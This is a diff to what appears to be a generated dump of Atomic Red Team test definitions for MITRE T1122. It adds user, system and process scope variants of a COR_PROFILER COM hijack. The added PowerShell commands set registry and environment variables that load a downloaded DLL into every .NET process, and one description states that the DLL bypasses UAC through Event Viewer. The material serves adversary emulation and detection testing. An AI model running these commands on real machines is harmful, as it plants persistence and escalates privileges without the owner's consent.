@@ -28,7 +28,6 @@ New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER" -PropertyType Stri
 New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -PropertyType String -Value PathToAtomicsFolder\T1122\bin\T1122x64.dll -Force | Out-Null
 Write-Host "executing eventvwr.msc" -ForegroundColor Cyan
 START MMC.EXE EVENTVWR.MSC
-Start-Sleep 5
 
 Write-Host "Creating registry keys in HKCU:Software\Classes\CLSID\{09108e71-974c-4010-89cb-acf471ae9e2c}" -ForegroundColor Cyan
 New-Item -Path "HKCU:\Software\Classes\CLSID\{09108e71-974c-4010-89cb-acf471ae9e2c}\InprocServer32" -Value #{file_name} -Force | Out-Null
@@ -37,7 +36,26 @@ New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER" -PropertyType Stri
 New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -PropertyType String -Value #{file_name} -Force | Out-Null
 Write-Host "executing eventvwr.msc" -ForegroundColor Cyan
 START MMC.EXE EVENTVWR.MSC
-Start-Sleep 5
+
+Write-Host "Creating system environment variables" -ForegroundColor Cyan
+New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null
+New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER" -PropertyType String -Value "#{clsid_guid}" -Force | Out-Null
+New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER_PATH" -PropertyType String -Value PathToAtomicsFolder\T1122\bin\T1122x64.dll -Force | Out-Null
+
+Write-Host "Creating system environment variables" -ForegroundColor Cyan
+New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null
+New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER" -PropertyType String -Value "{09108e71-974c-4010-89cb-acf471ae9e2c}" -Force | Out-Null
+New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER_PATH" -PropertyType String -Value #{file_name} -Force | Out-Null
+
+$env:COR_ENABLE_PROFILING = 1
+$env:COR_PROFILER = '#{clsid_guid}'
+$env:COR_PROFILER_PATH = 'PathToAtomicsFolder\T1122\bin\T1122x64.dll'
+POWERSHELL -c 'Start-Sleep 1'
+
+$env:COR_ENABLE_PROFILING = 1
+$env:COR_PROFILER = '{09108e71-974c-4010-89cb-acf471ae9e2c}'
+$env:COR_PROFILER_PATH = '#{file_name}'
+POWERSHELL -c 'Start-Sleep 1'
 
 \\Software\\Classes\\CLSID\\.+\\InprocServer32
 \\Software\\Classes\\CLSID\\.+\\InprocServer32
@@ -62,8 +80,7 @@ Start-Sleep 5
              '"COR_PROFILER_PATH" -PropertyType String -Value '
              'PathToAtomicsFolder\\T1122\\bin\\T1122x64.dll -Force | Out-Null\n'
              'Write-Host "executing eventvwr.msc" -ForegroundColor Cyan\n'
-             'START MMC.EXE EVENTVWR.MSC\n'
-             'Start-Sleep 5\n',
+             'START MMC.EXE EVENTVWR.MSC\n',
   'name': None,
   'source': 'atomics/T1122/T1122.yaml'},
  {'command': 'Write-Host "Creating registry keys in '
@@ -82,8 +99,54 @@ Start-Sleep 5
              '"COR_PROFILER_PATH" -PropertyType String -Value #{file_name} '
              '-Force | Out-Null\n'
              'Write-Host "executing eventvwr.msc" -ForegroundColor Cyan\n'
-             'START MMC.EXE EVENTVWR.MSC\n'
-             'Start-Sleep 5\n',
+             'START MMC.EXE EVENTVWR.MSC\n',
+  'name': None,
+  'source': 'atomics/T1122/T1122.yaml'},
+ {'command': 'Write-Host "Creating system environment variables" '
+             '-ForegroundColor Cyan\n'
+             'New-ItemProperty -Path '
+             "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
+             'Manager\\Environment\' -Name "COR_ENABLE_PROFILING" '
+             '-PropertyType String -Value "1" -Force | Out-Null\n'
+             'New-ItemProperty -Path '
+             "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
+             'Manager\\Environment\' -Name "COR_PROFILER" -PropertyType String '
+             '-Value "#{clsid_guid}" -Force | Out-Null\n'
+             'New-ItemProperty -Path '
+             "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
+             'Manager\\Environment\' -Name "COR_PROFILER_PATH" -PropertyType '
+             'String -Value PathToAtomicsFolder\\T1122\\bin\\T1122x64.dll '
+             '-Force | Out-Null\n',
+  'name': None,
+  'source': 'atomics/T1122/T1122.yaml'},
+ {'command': 'Write-Host "Creating system environment variables" '
+             '-ForegroundColor Cyan\n'
+             'New-ItemProperty -Path '
+             "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
+             'Manager\\Environment\' -Name "COR_ENABLE_PROFILING" '
+             '-PropertyType String -Value "1" -Force | Out-Null\n'
+             'New-ItemProperty -Path '
+             "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
+             'Manager\\Environment\' -Name "COR_PROFILER" -PropertyType String '
+             '-Value "{09108e71-974c-4010-89cb-acf471ae9e2c}" -Force | '
+             'Out-Null\n'
+             'New-ItemProperty -Path '
+             "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
+             'Manager\\Environment\' -Name "COR_PROFILER_PATH" -PropertyType '
+             'String -Value #{file_name} -Force | Out-Null\n',
+  'name': None,
+  'source': 'atomics/T1122/T1122.yaml'},
+ {'command': '$env:COR_ENABLE_PROFILING = 1\n'
+             "$env:COR_PROFILER = '#{clsid_guid}'\n"
+             '$env:COR_PROFILER_PATH = '
+             "'PathToAtomicsFolder\\T1122\\bin\\T1122x64.dll'\n"
+             "POWERSHELL -c 'Start-Sleep 1'\n",
+  'name': None,
+  'source': 'atomics/T1122/T1122.yaml'},
+ {'command': '$env:COR_ENABLE_PROFILING = 1\n'
+             "$env:COR_PROFILER = '{09108e71-974c-4010-89cb-acf471ae9e2c}'\n"
+             "$env:COR_PROFILER_PATH = '#{file_name}'\n"
+             "POWERSHELL -c 'Start-Sleep 1'\n",
   'name': None,
   'source': 'atomics/T1122/T1122.yaml'},
  {'command': '\\\\Software\\\\Classes\\\\CLSID\\\\.+\\\\InprocServer32',
@@ -139,16 +202,22 @@ Start-Sleep 5
                                                                                                                           '1}\n'}],
                                                                                       'dependency_executor_name': 'powershell',
                                                                                       'description': 'Creates '
+                                                                                                     'user '
+                                                                                                     'scope '
                                                                                                      'environment '
                                                                                                      'variables '
                                                                                                      'and '
                                                                                                      'CLSID '
+                                                                                                     'COM '
+                                                                                                     'object '
                                                                                                      'to '
                                                                                                      'enable '
                                                                                                      'a '
                                                                                                      '.NET '
-                                                                                                     'profiler. '
+                                                                                                     'profiler '
+                                                                                                     '(COR_PROFILER). '
                                                                                                      'The '
+                                                                                                     'unmanaged '
                                                                                                      'profiler '
                                                                                                      'DLL '
                                                                                                      '(`atomicNotepad.dll`) '
@@ -251,7 +320,7 @@ Start-Sleep 5
                                                                                                                       '"COR_PROFILER_PATH" '
                                                                                                                       '-Force '
                                                                                                                       '| '
-                                                                                                                      'Out-Null',
+                                                                                                                      'Out-Null\n',
                                                                                                    'command': 'Write-Host '
                                                                                                               '"Creating '
                                                                                                               'registry '
@@ -311,9 +380,7 @@ Start-Sleep 5
                                                                                                               'Cyan\n'
                                                                                                               'START '
                                                                                                               'MMC.EXE '
-                                                                                                              'EVENTVWR.MSC\n'
-                                                                                                              'Start-Sleep '
-                                                                                                              '5\n',
+                                                                                                              'EVENTVWR.MSC\n',
                                                                                                    'elevation_required': False,
                                                                                                    'name': 'powershell'},
                                                                                       'input_arguments': {'clsid_guid': {'default': '{09108e71-974c-4010-89cb-acf471ae9e2c}',
@@ -322,15 +389,328 @@ Start-Sleep 5
                                                                                                                                         'guid',
                                                                                                                          'type': 'String'},
                                                                                                           'file_name': {'default': 'PathToAtomicsFolder\\T1122\\bin\\T1122x64.dll',
-                                                                                                                        'description': 'profiler '
+                                                                                                                        'description': 'unmanaged '
+                                                                                                                                       'profiler '
                                                                                                                                        'DLL',
                                                                                                                         'type': 'Path'}},
                                                                                       'name': 'COM '
                                                                                               'Hijack '
                                                                                               'Leveraging '
-                                                                                              '.NET '
-                                                                                              'profiler '
-                                                                                              'DLL',
+                                                                                              'user '
+                                                                                              'scope '
+                                                                                              'COR_PROFILER',
+                                                                                      'supported_platforms': ['windows']},
+                                                                                     {'dependencies': [{'description': '#{file_name} '
+                                                                                                                       'must '
+                                                                                                                       'be '
+                                                                                                                       'present\n',
+                                                                                                        'get_prereq_command': 'New-Item '
+                                                                                                                              '-Type '
+                                                                                                                              'Directory '
+                                                                                                                              '(split-path '
+                                                                                                                              '#{file_name}) '
+                                                                                                                              '-ErrorAction '
+                                                                                                                              'ignore '
+                                                                                                                              '| '
+                                                                                                                              'Out-Null\n'
+                                                                                                                              'Invoke-WebRequest '
+                                                                                                                              '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1122/bin/T1122x64.dll" '
+                                                                                                                              '-OutFile '
+                                                                                                                              '"#{file_name}"\n',
+                                                                                                        'prereq_command': 'if '
+                                                                                                                          '(Test-Path '
+                                                                                                                          '#{file_name}) '
+                                                                                                                          '{exit '
+                                                                                                                          '0} '
+                                                                                                                          'else '
+                                                                                                                          '{exit '
+                                                                                                                          '1}\n'}],
+                                                                                      'dependency_executor_name': 'powershell',
+                                                                                      'description': 'Creates '
+                                                                                                     'system '
+                                                                                                     'scope '
+                                                                                                     'environment '
+                                                                                                     'variables '
+                                                                                                     'to '
+                                                                                                     'enable '
+                                                                                                     'a '
+                                                                                                     '.NET '
+                                                                                                     'profiler '
+                                                                                                     '(COR_PROFILER). '
+                                                                                                     'System '
+                                                                                                     'scope '
+                                                                                                     'environment '
+                                                                                                     'variables '
+                                                                                                     'require '
+                                                                                                     'a '
+                                                                                                     'restart '
+                                                                                                     'to '
+                                                                                                     'take '
+                                                                                                     'effect. '
+                                                                                                     'The '
+                                                                                                     'unmanaged '
+                                                                                                     'profiler '
+                                                                                                     'DLL '
+                                                                                                     '(`atomicNotepad.dll`) '
+                                                                                                     'executes '
+                                                                                                     'when '
+                                                                                                     'the '
+                                                                                                     'CLR '
+                                                                                                     'is '
+                                                                                                     'loaded '
+                                                                                                     'by '
+                                                                                                     'any '
+                                                                                                     'process. '
+                                                                                                     'Additionally, '
+                                                                                                     'the '
+                                                                                                     'profiling '
+                                                                                                     'DLL '
+                                                                                                     'will '
+                                                                                                     'inherit '
+                                                                                                     'the '
+                                                                                                     'integrity '
+                                                                                                     'level '
+                                                                                                     'of '
+                                                                                                     'Event '
+                                                                                                     'Viewer '
+                                                                                                     'bypassing '
+                                                                                                     'UAC '
+                                                                                                     'and '
+                                                                                                     'executing '
+                                                                                                     '`notepad.exe` '
+                                                                                                     'with '
+                                                                                                     'high '
+                                                                                                     'integrity. '
+                                                                                                     'If '
+                                                                                                     'the '
+                                                                                                     'account '
+                                                                                                     'used '
+                                                                                                     'is '
+                                                                                                     'not '
+                                                                                                     'a '
+                                                                                                     'local '
+                                                                                                     'administrator '
+                                                                                                     'the '
+                                                                                                     'profiler '
+                                                                                                     'DLL '
+                                                                                                     'will '
+                                                                                                     'still '
+                                                                                                     'execute '
+                                                                                                     'each '
+                                                                                                     'time '
+                                                                                                     'the '
+                                                                                                     'CLR '
+                                                                                                     'is '
+                                                                                                     'loaded '
+                                                                                                     'by '
+                                                                                                     'a '
+                                                                                                     'process, '
+                                                                                                     'however, '
+                                                                                                     'the '
+                                                                                                     'notepad '
+                                                                                                     'process '
+                                                                                                     'will '
+                                                                                                     'not '
+                                                                                                     'execute '
+                                                                                                     'with '
+                                                                                                     'high '
+                                                                                                     'integrity. \n',
+                                                                                      'executor': {'cleanup_command': 'Write-Host '
+                                                                                                                      '"Removing '
+                                                                                                                      'system '
+                                                                                                                      'environment '
+                                                                                                                      'variables" '
+                                                                                                                      '-ForegroundColor '
+                                                                                                                      'Cyan\n'
+                                                                                                                      'Remove-ItemProperty '
+                                                                                                                      '-Path '
+                                                                                                                      "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
+                                                                                                                      "Manager\\Environment' "
+                                                                                                                      '-Name '
+                                                                                                                      '"COR_ENABLE_PROFILING" '
+                                                                                                                      '-Force '
+                                                                                                                      '| '
+                                                                                                                      'Out-Null\n'
+                                                                                                                      'Remove-ItemProperty '
+                                                                                                                      '-Path '
+                                                                                                                      "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
+                                                                                                                      "Manager\\Environment' "
+                                                                                                                      '-Name '
+                                                                                                                      '"COR_PROFILER" '
+                                                                                                                      '-Force '
+                                                                                                                      '| '
+                                                                                                                      'Out-Null\n'
+                                                                                                                      'Remove-ItemProperty '
+                                                                                                                      '-Path '
+                                                                                                                      "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
+                                                                                                                      "Manager\\Environment' "
+                                                                                                                      '-Name '
+                                                                                                                      '"COR_PROFILER_PATH" '
+                                                                                                                      '-Force '
+                                                                                                                      '| '
+                                                                                                                      'Out-Null\n',
+                                                                                                   'command': 'Write-Host '
+                                                                                                              '"Creating '
+                                                                                                              'system '
+                                                                                                              'environment '
+                                                                                                              'variables" '
+                                                                                                              '-ForegroundColor '
+                                                                                                              'Cyan\n'
+                                                                                                              'New-ItemProperty '
+                                                                                                              '-Path '
+                                                                                                              "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
+                                                                                                              "Manager\\Environment' "
+                                                                                                              '-Name '
+                                                                                                              '"COR_ENABLE_PROFILING" '
+                                                                                                              '-PropertyType '
+                                                                                                              'String '
+                                                                                                              '-Value '
+                                                                                                              '"1" '
+                                                                                                              '-Force '
+                                                                                                              '| '
+                                                                                                              'Out-Null\n'
+                                                                                                              'New-ItemProperty '
+                                                                                                              '-Path '
+                                                                                                              "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
+                                                                                                              "Manager\\Environment' "
+                                                                                                              '-Name '
+                                                                                                              '"COR_PROFILER" '
+                                                                                                              '-PropertyType '
+                                                                                                              'String '
+                                                                                                              '-Value '
+                                                                                                              '"#{clsid_guid}" '
+                                                                                                              '-Force '
+                                                                                                              '| '
+                                                                                                              'Out-Null\n'
+                                                                                                              'New-ItemProperty '
+                                                                                                              '-Path '
+                                                                                                              "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
+                                                                                                              "Manager\\Environment' "
+                                                                                                              '-Name '
+                                                                                                              '"COR_PROFILER_PATH" '
+                                                                                                              '-PropertyType '
+                                                                                                              'String '
+                                                                                                              '-Value '
+                                                                                                              '#{file_name} '
+                                                                                                              '-Force '
+                                                                                                              '| '
+                                                                                                              'Out-Null\n',
+                                                                                                   'elevation_required': True,
+                                                                                                   'name': 'powershell'},
+                                                                                      'input_arguments': {'clsid_guid': {'default': '{09108e71-974c-4010-89cb-acf471ae9e2c}',
+                                                                                                                         'description': 'custom '
+                                                                                                                                        'clsid '
+                                                                                                                                        'guid',
+                                                                                                                         'type': 'String'},
+                                                                                                          'file_name': {'default': 'PathToAtomicsFolder\\T1122\\bin\\T1122x64.dll',
+                                                                                                                        'description': 'unmanaged '
+                                                                                                                                       'profiler '
+                                                                                                                                       'DLL',
+                                                                                                                        'type': 'Path'}},
+                                                                                      'name': 'COM '
+                                                                                              'Hijack '
+                                                                                              'Leveraging '
+                                                                                              'System '
+                                                                                              'Scope '
+                                                                                              'COR_PROFILER',
+                                                                                      'supported_platforms': ['windows']},
+                                                                                     {'dependencies': [{'description': '#{file_name} '
+                                                                                                                       'must '
+                                                                                                                       'be '
+                                                                                                                       'present\n',
+                                                                                                        'get_prereq_command': 'New-Item '
+                                                                                                                              '-Type '
+                                                                                                                              'Directory '
+                                                                                                                              '(split-path '
+                                                                                                                              '#{file_name}) '
+                                                                                                                              '-ErrorAction '
+                                                                                                                              'ignore '
+                                                                                                                              '| '
+                                                                                                                              'Out-Null\n'
+                                                                                                                              'Invoke-WebRequest '
+                                                                                                                              '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1122/bin/T1122x64.dll" '
+                                                                                                                              '-OutFile '
+                                                                                                                              '"#{file_name}"\n',
+                                                                                                        'prereq_command': 'if '
+                                                                                                                          '(Test-Path '
+                                                                                                                          '#{file_name}) '
+                                                                                                                          '{exit '
+                                                                                                                          '0} '
+                                                                                                                          'else '
+                                                                                                                          '{exit '
+                                                                                                                          '1}\n'}],
+                                                                                      'dependency_executor_name': 'powershell',
+                                                                                      'description': 'Creates '
+                                                                                                     'process '
+                                                                                                     'scope '
+                                                                                                     'environment '
+                                                                                                     'variables '
+                                                                                                     'to '
+                                                                                                     'enable '
+                                                                                                     'a '
+                                                                                                     '.NET '
+                                                                                                     'profiler '
+                                                                                                     '(COR_PROFILER) '
+                                                                                                     'without '
+                                                                                                     'making '
+                                                                                                     'changes '
+                                                                                                     'to '
+                                                                                                     'the '
+                                                                                                     'registry. '
+                                                                                                     'The '
+                                                                                                     'unmanaged '
+                                                                                                     'profiler '
+                                                                                                     'DLL '
+                                                                                                     '(`atomicNotepad.dll`) '
+                                                                                                     'executes '
+                                                                                                     'when '
+                                                                                                     'the '
+                                                                                                     'CLR '
+                                                                                                     'is '
+                                                                                                     'loaded '
+                                                                                                     'by '
+                                                                                                     'PowerShell.\n',
+                                                                                      'executor': {'cleanup_command': '$env:COR_ENABLE_PROFILING '
+                                                                                                                      '= '
+                                                                                                                      '0\n'
+                                                                                                                      '$env:COR_PROFILER '
+                                                                                                                      '= '
+                                                                                                                      "''\n"
+                                                                                                                      '$env:COR_PROFILER_PATH '
+                                                                                                                      '= '
+                                                                                                                      "''\n",
+                                                                                                   'command': '$env:COR_ENABLE_PROFILING '
+                                                                                                              '= '
+                                                                                                              '1\n'
+                                                                                                              '$env:COR_PROFILER '
+                                                                                                              '= '
+                                                                                                              "'#{clsid_guid}'\n"
+                                                                                                              '$env:COR_PROFILER_PATH '
+                                                                                                              '= '
+                                                                                                              "'#{file_name}'\n"
+                                                                                                              'POWERSHELL '
+                                                                                                              '-c '
+                                                                                                              "'Start-Sleep "
+                                                                                                              "1'\n",
+                                                                                                   'elevation_required': False,
+                                                                                                   'name': 'powershell'},
+                                                                                      'input_arguments': {'clsid_guid': {'default': '{09108e71-974c-4010-89cb-acf471ae9e2c}',
+                                                                                                                         'description': 'custom '
+                                                                                                                                        'clsid '
+                                                                                                                                        'guid',
+                                                                                                                         'type': 'String'},
+                                                                                                          'file_name': {'default': 'PathToAtomicsFolder\\T1122\\bin\\T1122x64.dll',
+                                                                                                                        'description': 'unamanged '
+                                                                                                                                       'profiler '
+                                                                                                                                       'DLL',
+                                                                                                                        'type': 'Path'}},
+                                                                                      'name': 'COM '
+                                                                                              'Hijack '
+                                                                                              'Leveraging '
+                                                                                              'registry-free '
+                                                                                              'process '
+                                                                                              'scope '
+                                                                                              'COR_PROFILER',
                                                                                       'supported_platforms': ['windows']}],
                                                                     'attack_technique': 'T1122',
                                                                     'display_name': 'Component '
